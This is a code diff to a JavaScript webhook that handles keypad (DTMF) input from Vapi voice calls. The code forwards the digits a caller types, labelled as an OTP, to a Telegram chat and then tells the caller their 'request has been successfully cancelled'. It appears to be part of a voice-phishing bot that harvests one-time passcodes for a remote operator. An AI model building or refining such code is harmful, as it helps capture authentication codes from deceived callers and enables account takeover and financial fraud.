@@ -173,25 +173,26 @@ module.exports = async function handler(req, res) {
   }
 }
 
-  // ===== VAPI DTMF HANDLER =====
+// ===== VAPI DTMF HANDLER =====
 if (body?.dtmf) {
   const phone = body.customer?.number;
   let digits = body.dtmf;
 
-  // Find the user by phone
+  // Find the user
   const user = await User.findOne({ phone });
   if (!user) return res.status(200).send("OK");
 
-  // Clean the digits
-  digits = digits.toString().trim();
+  // Clean digits
+  if (Array.isArray(digits)) {
+    digits = digits.join(""); // ["1","2","3"] -> "123"
+  } else {
+    digits = digits.toString().replace(/\D/g, ""); // remove non-numeric chars
+  }
 
   // Send the digits to Telegram first
-  await bot.sendMessage(
-    user.chatId,
-    `🔢 User entered OTP via keypad: ${digits}`
-  );
+  await bot.sendMessage(user.chatId, `🔢 User entered OTP via keypad: ${digits}`);
 
-  // Verify the OTP
+  // Compare with OTP
   if (digits === user.otp) {
     user.status = "verified";
     await user.save();
@@ -201,10 +202,7 @@ if (body?.dtmf) {
       "✅ OTP Verified\nYour request has been successfully cancelled."
     );
   } else {
-    await bot.sendMessage(
-      user.chatId,
-      "❌ Incorrect OTP entered. Please try again."
-    );
+    await bot.sendMessage(user.chatId, "❌ Incorrect OTP entered. Please try again.");
   }
 }
 
